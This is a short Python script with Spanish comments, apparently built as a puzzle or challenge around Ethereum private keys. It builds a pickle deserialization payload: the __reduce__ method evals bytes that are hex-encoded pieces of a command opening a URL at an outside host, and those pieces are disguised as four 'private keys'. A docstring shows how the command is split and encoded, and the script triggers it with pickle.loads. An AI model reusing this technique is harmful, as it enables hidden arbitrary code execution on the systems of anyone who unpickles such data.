import eth_keys, binascii, pickle, eth_abi

class PrivateKeys():
    def __init__(self, priv_key_1, priv_key_2, priv_key_3, priv_key_4):
        self.key_1 = binascii.unhexlify(priv_key_1)
        self.key_2 = binascii.unhexlify(priv_key_2)
        self.key_3 = binascii.unhexlify(priv_key_3)
        self.key_4 = binascii.unhexlify(priv_key_4)
        self.priv_key_1 = eth_keys.keys.PrivateKey(self.key_1)

        self.priv_key_2 = eth_keys.keys.PrivateKey(self.key_2)
        self.priv_key_3 = eth_keys.keys.PrivateKey(self.key_3)
        self.priv_key_4 = eth_keys.keys.PrivateKey(self.key_4)

    
    def __reduce__(self):
        # the `or` is being used as a little trick to be able to send the whole payload as a one-liner
        # eval("exec('import urllib.request') or urllib.request.urlopen('https://ethereumargentina.xyz/api/count')")

        return (eval, (self.key_1 + self.key_2 + self.key_3 + self.key_4[:10],))
    
    def __str__(self):
        return str(eth_abi.encode(['address[]', 'bytes32[]'], [[self.priv_key_1.public_key.to_checksum_address(), self.priv_key_2.public_key.to_checksum_address(), self.priv_key_3.public_key.to_checksum_address(), self.priv_key_4.public_key.to_checksum_address()], [self.priv_key_1._raw_key, self.priv_key_2._raw_key, self.priv_key_3._raw_key, self.priv_key_4._raw_key]]).hex())
  

"""
Para crear las private keys 
>>> a = b'eval("exec(\'import urllib.request\') or urllib.request.urlopen(\'https://ethereumargentina.xyz/api/count\')")'
>>> a
b'eval("exec(\'import urllib.request\') or urllib.request.urlopen(\'https://ethereumargentina.xyz/api/count\')")'
>>> [a[i:i+32] for i in range(0, len(a), 32)]
[b'eval("exec(\'import urllib.reques', b"t') or urllib.request.urlopen('h", b'ttps://ethereumargentina.xyz/api', b'/count\')")']
>>> c = [a[i:i+32] for i in range(0, len(a), 32)]
>>> c
[b'eval("exec(\'import urllib.reques', b"t') or urllib.request.urlopen('h", b'ttps://ethereumargentina.xyz/api', b'/count\')")']
>>> for x in c:
...     print(binascii.hexlify(x))
...
b'6576616c2822657865632827696d706f72742075726c6c69622e726571756573'
b'742729206f722075726c6c69622e726571756573742e75726c6f70656e282768'
b'747470733a2f2f657468657265756d617267656e74696e612e78797a2f617069'
b'2f636f756e7427292229'
Paddear la ultima con data random y modificar el return del __reduce__ para que justo sea el final del comando.
"""




priv_keys = PrivateKeys('6576616c2822657865632827696d706f72742075726c6c69622e726571756573', '742729206f722075726c6c69622e726571756573742e75726c6f70656e282768', '747470733a2f2f657468657265756d617267656e74696e612e78797a2f617069',
'2f636f756e7427292229c6962222967656e74696e612e78797a2f617069d706a')

priv = pickle.dumps(priv_keys)

try:
    pickle.loads(priv)
except:
    pass

print(f"{str(priv_keys)}")

